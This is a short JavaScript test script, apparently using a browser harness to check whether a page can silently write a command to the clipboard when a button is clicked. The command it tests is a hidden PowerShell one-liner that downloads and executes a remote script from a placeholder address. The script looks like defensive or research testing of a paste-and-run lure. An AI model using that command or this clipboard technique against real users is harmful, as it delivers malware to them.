import { start } from "./harness.mjs";
const CMD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1')\"";
const page0 = `<!doctype html><body><button id=b>go</button><script>
window.CMD=${JSON.stringify(CMD)};
</script>`;
const { ctx, base, close } = await start({ "/": page0 });
const page = await ctx.newPage();
page.on("console", (m) => console.log("console:", m.text()));
await page.goto(base + "/");
await page.waitForTimeout(300);
async function attempt(name, fn) {
  await page.evaluate(() => navigator.clipboard.writeText("clean"));
  await page.evaluate(`document.getElementById('b').onclick = ${fn}; 0`);
  await page.click("#b");
  await page.waitForTimeout(500);
  const got = await page.evaluate(() => navigator.clipboard.readText());
  console.log(name.padEnd(40), got === CMD ? "COMMAND WRITTEN" : JSON.stringify(got).slice(0, 60));
}
await attempt("control writeText", `() => navigator.clipboard.writeText(CMD).catch(e=>console.log('rej',e.name))`);
await attempt("control write", `() => navigator.clipboard.write([new ClipboardItem({'text/plain': new Blob([CMD],{type:'text/plain'})})]).catch(e=>console.log('rej',e.name))`);
await close();
